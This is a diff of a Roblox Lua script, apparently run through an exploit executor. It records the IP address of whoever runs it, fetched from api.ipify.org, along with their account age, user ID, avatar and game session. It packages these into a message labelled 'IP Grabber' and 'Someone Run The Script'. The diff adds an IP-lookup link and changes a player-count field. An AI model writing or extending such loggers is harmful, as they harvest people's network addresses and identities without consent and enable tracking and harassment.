@@ -6,7 +6,6 @@ local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 Parent = game.Workspace
 local Day = game.Players.LocalPlayer.AccountAge
 local MaxPlr = game.Players.MaxPlayers
-local RespawnPlr = game.Players.RespawnTime
 local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local ExecuteR = identifyexecutor()
 local JobIDG = game.JobId
@@ -29,6 +28,7 @@ local executor = identifyexecutor() or "Unknown"
 local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
 Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
 local AvatarImage = Thing.imageUrl
+local players = game.Players:GetPlayers()
 local PlayerData =
 {
        ["content"] = "@everyone **Someone Run The Script**",
@@ -68,12 +68,12 @@ local PlayerData =
             },
             {
                 ["name"] = "IP Grabber",
-                ["value"] = "**"..ip.."**",
+                ["value"] = "**["..ip.."](" .. tostring("https://checkip.thaiware.com/?ip=" .. ip) .. ")**",
                 ["inline"] = true
             },
             {
                 ["name"] = "Game Place Id",
-                ["value"] = "**["..GPID.."](" .. tostring("https://www.roblox.com/games/".. GPID)..")**",
+                ["value"] = "**["..GPID.."](" .. tostring("https://www.roblox.com/games/".. GPID) .. ")**",
                 ["inline"] = true
             },
             {
@@ -83,7 +83,7 @@ local PlayerData =
             },
             {
                 ["name"] = "Max Player",
-                ["value"] = "**"..MaxPlr.."**/" .. "**"..RespawnPlr.."**",
+                ["value"] = "**"..#players.."**/" .. "**"..MaxPlr.."**",
                 ["inline"] = true
             },
         },
